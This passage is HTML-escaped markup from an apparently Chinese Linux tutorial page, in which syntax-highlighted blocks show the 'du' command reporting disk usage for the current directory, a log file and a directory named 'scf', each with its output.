&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09775861615007-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09775861615007-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09775861615007-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09775861615007-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09775861615007-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09775861615007-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09775861615007-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09775861615007-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09775861615007-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09775861615007-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09775861615007-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09775861615007-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09775861615007-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09775861615007-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09775861615007-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09775861615007-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09775861615007-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09775861615007-27&quot;&gt;27&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09775861615007-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# du&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09775861615007-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09775861615007-3&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;608&lt;/span&gt;     &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test6&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09775861615007-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09775861615007-5&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;308&lt;/span&gt;     &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test4&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09775861615007-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09775861615007-7&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;       &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;lib&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09775861615007-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09775861615007-9&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;       &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;deploy&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;product&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09775861615007-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09775861615007-11&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;       &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;deploy&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;info&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09775861615007-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09775861615007-13&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;      &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;deploy&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09775861615007-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09775861615007-15&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;      &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;service&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09775861615007-16&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09775861615007-17&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;       &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;doc&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09775861615007-18&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09775861615007-19&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;       &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;bin&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09775861615007-20&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09775861615007-21&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt;      &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;scf&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09775861615007-22&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09775861615007-23&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;8&lt;/span&gt;       &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test3&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09775861615007-24&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09775861615007-25&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;1288&lt;/span&gt;    &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09775861615007-26&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09775861615007-27&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;#&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0029 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;只显示当前目录下面的子目录的目录大小和当前目录的总的大小，最下面的1288为当前目录的总大小&lt;/p&gt;
&lt;p&gt;实例2：显示指定文件所占空间&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aceed09779141571691&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
du log2012.log&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09779141571691-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09779141571691-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;du&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0004 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aceed0977c784388604&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test]# du log2012.log 

300     log2012.log

[root@localhost test]#&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0977c784388604-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0977c784388604-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0977c784388604-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0977c784388604-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0977c784388604-5&quot;&gt;5&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0977c784388604-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# du log2012.log &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0977c784388604-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0977c784388604-3&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;300&lt;/span&gt;     &lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0977c784388604-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0977c784388604-5&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;#&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0009 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;实例3：查看指定目录的所占空间&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aceed0977f588791143&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
du scf&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0977f588791143-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0977f588791143-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;du&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0004 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aceed09782426177068&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test]# du scf

4       scf/lib

4       scf/service/deploy/product

4       scf/service/deploy/info

12      scf/service/deploy

16      scf/service

4       scf/doc

4       scf/bin

32      scf

[root@localhost test]#&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
